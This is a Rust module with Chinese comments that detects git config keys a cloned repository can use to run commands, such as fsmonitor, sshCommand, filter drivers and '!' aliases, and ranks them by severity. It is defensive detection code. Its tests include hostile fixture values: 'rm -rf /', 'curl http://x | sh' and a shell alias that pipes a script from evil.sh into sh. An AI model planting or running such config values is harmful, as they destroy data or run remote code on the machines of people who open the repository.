//! 仓库配置审计：识别"打开一个陌生仓库"时可能执行任意命令的配置项。
//!
//! # 威胁模型
//!
//! 克隆或下载一个仓库之后，`.git/config` 与仓库根的 `.gitattributes`
//! **是攻击者可控的输入**（`docs/PLAN.md` §5.12 的第一条威胁）。git 会在
//! 我们完全无法预料的时机执行其中的命令：
//!
//! | 配置键 | 何时被 git 执行 |
//! | --- | --- |
//! | `core.fsmonitor`（路径形式） | 每次 `status` / `add` 刷新索引时 |
//! | `core.sshCommand` | 每次 ssh 传输时 |
//! | `filter.<name>.clean` / `.smudge` / `.process` | 每次 `add` / `checkout` 该路径时 |
//! | `alias.<name>` 以 `!` 开头 | 用户（或本应用）调用该别名时 |
//! | `core.pager` / `core.editor` | 输出分页 / 需要编辑时 |
//! | `core.hooksPath` | 每次 commit / checkout 等触发 hook 时 |
//!
//! 本模块**只识别与报告**，不做任何拦截：拦截策略（是否禁用 hook、
//! 是否拒绝打开）属于界面决策。领域层保持纯函数，因此可以穷举测试
//! 每一条规则，而不必构造一个真的恶意仓库。
//!
//! # 为什么读到的值必须已脱敏
//!
//! `core.sshCommand` 与 `filter.*.clean` 里可能内嵌凭据（`https://user:token@…`）。
//! 审计结果会被写进日志、展示在界面上（红线 R8）。本模块不做脱敏——
//! 脱敏在 `forgedesk-diagnostics`，由读取配置的 infra 层在**读入时**完成，
//! 这样审计报告从产生的那一刻起就是可安全传播的。

/// 配置项来自哪个范围。
///
/// 只审计 `Local` 与 `Worktree`：它们是**随仓库分发**的。
/// `Global` / `System` 是用户自己机器上的选择，不属于"陌生仓库带来的风险"，
/// 把它们报成警告只会训练用户忽略警告。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ConfigScope {
    /// 系统级（`/etc/gitconfig`）。
    System,
    /// 用户级（`~/.gitconfig`）。
    Global,
    /// 仓库级（`.git/config`）。
    Local,
    /// 工作区级（`.git/config.worktree`，`extensions.worktreeConfig` 开启时）。
    Worktree,
}

impl ConfigScope {
    /// 是否随仓库分发（决定是否参与审计）。
    pub const fn is_repository_scoped(self) -> bool {
        matches!(self, Self::Local | Self::Worktree)
    }

    /// 稳定的短名（日志与 DTO 用）。
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::System => "system",
            Self::Global => "global",
            Self::Local => "local",
            Self::Worktree => "worktree",
        }
    }
}

/// 一条配置项（键 + 值 + 范围）。
///
/// 值可能含凭据，调用方必须保证**已脱敏**（见模块头）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConfigEntry {
    /// 配置键，全小写，形如 `core.fsmonitor`、`filter.lfs.clean`。
    pub key: String,
    /// 配置值（已脱敏）。
    pub value: String,
    /// 来源范围。
    pub scope: ConfigScope,
}

/// 审计项的严重程度。
///
/// 三档而不是"是/否"：`Info` 与 `Warning` 的处置完全不同——
/// 前者只是"知道一下"，后者要用户确认，`Danger` 则意味着**已经具备
/// 执行任意命令的条件**，界面必须显著提示。
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum AuditSeverity {
    /// 提示信息，无需操作。
    Info,
    /// 值得知道：会改变 git 行为，但执行的是用户自己的工具。
    Warning,
    /// 危险：配置值会被 git 当命令执行。
    Danger,
}

impl AuditSeverity {
    /// 稳定的短名（日志与 DTO 用）。
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Info => "info",
            Self::Warning => "warning",
            Self::Danger => "danger",
        }
    }
}

/// 审计项的类别。
///
/// 用枚举而不是自由字符串：前端要按类别给出**不同的解释文案**，
/// 字符串拼错只会静默退化成兜底文案，而枚举的漏处理会被 Rust 编译器拦下。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum AuditFindingId {
    /// `core.fsmonitor` 指向外部命令（老版本 git 下布尔 `true` 也是）。
    Fsmonitor,
    /// `core.sshCommand`：每次 ssh 传输都会执行。
    SshCommand,
    /// `filter.<name>.clean`。
    FilterClean,
    /// `filter.<name>.smudge`。
    FilterSmudge,
    /// `filter.<name>.process`。
    FilterProcess,
    /// `alias.<name>` 以 `!` 开头（交给 shell 执行）。
    ShellAlias,
    /// `core.pager`。
    Pager,
    /// `core.editor`。
    Editor,
    /// `core.hooksPath`：把 hook 目录重定向到仓库内（hook 会随仓库一起分发）。
    HooksPath,
}

impl AuditFindingId {
    /// 稳定的短名（前端按它选择文案 key）。
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Fsmonitor => "fsmonitor",
            Self::SshCommand => "ssh_command",
            Self::FilterClean => "filter_clean",
            Self::FilterSmudge => "filter_smudge",
            Self::FilterProcess => "filter_process",
            Self::ShellAlias => "shell_alias",
            Self::Pager => "pager",
            Self::Editor => "editor",
            Self::HooksPath => "hooks_path",
        }
    }
}

/// 一条审计发现。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuditFinding {
    /// 类别。
    pub id: AuditFindingId,
    /// 严重程度。
    pub severity: AuditSeverity,
    /// 命中的配置键（原样，便于用户去 `git config` 里定位）。
    pub key: String,
    /// 命中的配置值（已脱敏）。
    pub value: String,
    /// 来源范围。
    pub scope: ConfigScope,
}

/// 审计报告。
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct RepoAuditReport {
    /// 全部发现（按配置读取顺序，稳定可复现）。
    pub findings: Vec<AuditFinding>,
}

impl RepoAuditReport {
    /// 没有任何发现。
    pub fn is_clean(&self) -> bool {
        self.findings.is_empty()
    }

    /// 最高严重程度；无发现时为 `None`。
    pub fn max_severity(&self) -> Option<AuditSeverity> {
        self.findings.iter().map(|finding| finding.severity).max()
    }

    /// 是否存在"会被 git 当命令执行"的配置。
    ///
    /// 界面据此决定是否默认禁用 hook / 弹出显著提示。
    pub fn has_danger(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity == AuditSeverity::Danger)
    }
}

/// 审计一组配置项。
///
/// 只处理 [`ConfigScope::is_repository_scoped`] 的条目（见 [`ConfigScope`] 的理由）。
/// 返回的发现顺序与输入顺序一致：同样的配置在任何机器上都给出同样的报告，
/// 这样测试可以直接断言整个列表。
pub fn audit_config(entries: &[ConfigEntry]) -> RepoAuditReport {
    let mut findings = Vec::new();

    for entry in entries {
        if !entry.scope.is_repository_scoped() {
            continue;
        }
        if let Some((id, severity)) = classify_entry(entry) {
            findings.push(AuditFinding {
                id,
                severity,
                key: entry.key.clone(),
                value: entry.value.clone(),
                scope: entry.scope,
            });
        }
    }

    RepoAuditReport { findings }
}

/// 判断一条配置项是否值得报告，并给出类别与严重程度。
fn classify_entry(entry: &ConfigEntry) -> Option<(AuditFindingId, AuditSeverity)> {
    let key = entry.key.to_ascii_lowercase();
    let value = entry.value.trim();

    match key.as_str() {
        "core.fsmonitor" => {
            // `false` 是关闭。除此之外：
            // - git ≥ 2.37 的布尔 `true` 表示**内置**监视器（安全）；
            // - 其余取值是一条会被执行的命令（危险）。
            // 无法从配置本身分辨 git 版本，因此对布尔真值给 Warning，
            // 对路径/命令形式给 Danger——宁可多提醒，不可漏报。
            if is_disabled(value) {
                return None;
            }
            let severity = if is_enabled_boolean(value) {
                AuditSeverity::Warning
            } else {
                AuditSeverity::Danger
            };
            Some((AuditFindingId::Fsmonitor, severity))
        }
        "core.sshcommand" => non_empty(value, AuditFindingId::SshCommand, AuditSeverity::Danger),
        "core.pager" => non_empty(value, AuditFindingId::Pager, AuditSeverity::Warning),
        "core.editor" => non_empty(value, AuditFindingId::Editor, AuditSeverity::Warning),
        "core.hookspath" => non_empty(value, AuditFindingId::HooksPath, AuditSeverity::Warning),
        _ => {
            if let Some(name) = key.strip_prefix("filter.") {
                if name.ends_with(".clean") {
                    return non_empty(value, AuditFindingId::FilterClean, AuditSeverity::Danger);
                }
                if name.ends_with(".smudge") {
                    return non_empty(value, AuditFindingId::FilterSmudge, AuditSeverity::Danger);
                }
                if name.ends_with(".process") {
                    return non_empty(value, AuditFindingId::FilterProcess, AuditSeverity::Danger);
                }
                // `filter.<name>.required` / `.driver` 等不执行命令
                return None;
            }
            // `alias.<name>`：只有以 `!` 开头的才会交给 shell；其余是 git 子命令，
            // 无法执行任意命令（`alias.x = !...` 与 `alias.x = commit` 的区别）
            if key.starts_with("alias.") && value.starts_with('!') {
                return Some((AuditFindingId::ShellAlias, AuditSeverity::Danger));
            }
            None
        }
    }
}

/// 非空即报告。
fn non_empty(
    value: &str,
    id: AuditFindingId,
    severity: AuditSeverity,
) -> Option<(AuditFindingId, AuditSeverity)> {
    if value.is_empty() {
        None
    } else {
        Some((id, severity))
    }
}

/// git 布尔配置的"关闭"取值。
fn is_disabled(value: &str) -> bool {
    value.is_empty()
        || matches!(
            value.to_ascii_lowercase().as_str(),
            "false" | "no" | "off" | "0"
        )
}

/// git 布尔配置的"开启"取值。
fn is_enabled_boolean(value: &str) -> bool {
    matches!(
        value.to_ascii_lowercase().as_str(),
        "true" | "yes" | "on" | "1"
    )
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::{
        audit_config, AuditFindingId, AuditSeverity, ConfigEntry, ConfigScope, RepoAuditReport,
    };

    fn local(key: &str, value: &str) -> ConfigEntry {
        ConfigEntry {
            key: key.to_owned(),
            value: value.to_owned(),
            scope: ConfigScope::Local,
        }
    }

    fn ids(report: &RepoAuditReport) -> Vec<AuditFindingId> {
        report.findings.iter().map(|finding| finding.id).collect()
    }

    #[test]
    fn a_plain_repository_produces_no_findings() {
        let report = audit_config(&[
            local("core.repositoryformatversion", "0"),
            local("core.filemode", "true"),
            local("remote.origin.url", "https://example.com/a.git"),
            local("branch.main.remote", "origin"),
        ]);

        assert!(report.is_clean(), "普通仓库不应产生警告：{report:?}");
        assert_eq!(report.max_severity(), None);
        assert!(!report.has_danger());
    }

    #[test]
    fn fsmonitor_pointing_at_a_command_is_a_danger() {
        let report = audit_config(&[local("core.fsmonitor", "calc")]);

        assert_eq!(ids(&report), vec![AuditFindingId::Fsmonitor]);
        assert_eq!(report.max_severity(), Some(AuditSeverity::Danger));
        assert!(report.has_danger());
    }

    #[test]
    fn fsmonitor_boolean_true_is_only_a_warning_and_false_is_ignored() {
        // 布尔真值在 git ≥ 2.37 表示内置监视器（安全），在更老的版本表示 hook；
        // 无法从配置分辨版本，因此给 Warning 而不是 Danger
        let truthy = audit_config(&[local("core.fsmonitor", "true")]);
        assert_eq!(truthy.max_severity(), Some(AuditSeverity::Warning));

        assert!(audit_config(&[local("core.fsmonitor", "false")]).is_clean());
    }

    #[test]
    fn ssh_command_and_filters_are_dangers() {
        let report = audit_config(&[
            local("core.sshCommand", "ssh -i /tmp/key"),
            local("filter.evil.clean", "rm -rf /"),
            local("filter.evil.smudge", "curl http://x | sh"),
            local("filter.evil.process", "malware --serve"),
        ]);

        assert_eq!(
            ids(&report),
            vec![
                AuditFindingId::SshCommand,
                AuditFindingId::FilterClean,
                AuditFindingId::FilterSmudge,
                AuditFindingId::FilterProcess,
            ]
        );
        assert!(report.has_danger());
    }

    #[test]
    fn empty_values_are_not_reported() {
        // `git config core.pager ""` 表示"禁用分页器"，是安全配置
        let report = audit_config(&[
            local("core.pager", ""),
            local("core.editor", "   "),
            local("core.sshCommand", ""),
            local("filter.evil.clean", ""),
        ]);

        assert!(report.is_clean(), "空值不应产生警告：{report:?}");
    }

    #[test]
    fn only_shell_aliases_are_reported() {
        let report = audit_config(&[
            local("alias.st", "status --short"),
            local("alias.co", "checkout"),
            local("alias.pwn", "!sh -c 'curl evil.sh | sh'"),
        ]);

        assert_eq!(ids(&report), vec![AuditFindingId::ShellAlias]);
        assert_eq!(report.findings[0].key, "alias.pwn");
    }

    #[test]
    fn pager_editor_and_hooks_path_are_warnings() {
        let report = audit_config(&[
            local("core.pager", "less -R"),
            local("core.editor", "vim"),
            local("core.hooksPath", ".githooks"),
        ]);

        assert_eq!(
            ids(&report),
            vec![
                AuditFindingId::Pager,
                AuditFindingId::Editor,
                AuditFindingId::HooksPath,
            ]
        );
        assert_eq!(report.max_severity(), Some(AuditSeverity::Warning));
        assert!(!report.has_danger());
    }

    #[test]
    fn global_and_system_scopes_are_not_audited() {
        // 用户自己机器上的 `~/.gitconfig` 不是"陌生仓库带来的风险"，
        // 报成警告只会训练用户忽略警告
        let report = audit_config(&[
            ConfigEntry {
                key: "core.sshCommand".to_owned(),
                value: "ssh -i ~/.ssh/id_ed25519".to_owned(),
                scope: ConfigScope::Global,
            },
            ConfigEntry {
                key: "core.pager".to_owned(),
                value: "less".to_owned(),
                scope: ConfigScope::System,
            },
            ConfigEntry {
                key: "alias.pwn".to_owned(),
                value: "!sh".to_owned(),
                scope: ConfigScope::Worktree,
            },
        ]);

        assert_eq!(ids(&report), vec![AuditFindingId::ShellAlias]);
        assert_eq!(report.findings[0].scope, ConfigScope::Worktree);
    }

    #[test]
    fn keys_are_matched_case_insensitively() {
        let report = audit_config(&[local("Core.SSHCommand", "ssh -i k")]);
        assert_eq!(ids(&report), vec![AuditFindingId::SshCommand]);
    }

    #[test]
    fn findings_keep_the_input_order_and_original_values() {
        let report = audit_config(&[
            local("core.pager", "less"),
            local("core.sshCommand", "ssh -i k"),
            local("core.editor", "nano"),
        ]);

        assert_eq!(
            report
                .findings
                .iter()
                .map(|finding| finding.value.as_str())
                .collect::<Vec<_>>(),
            vec!["less", "ssh -i k", "nano"]
        );
    }

    #[test]
    fn severity_is_ordered_so_max_reports_the_worst() {
        assert!(AuditSeverity::Danger > AuditSeverity::Warning);
        assert!(AuditSeverity::Warning > AuditSeverity::Info);
    }
}
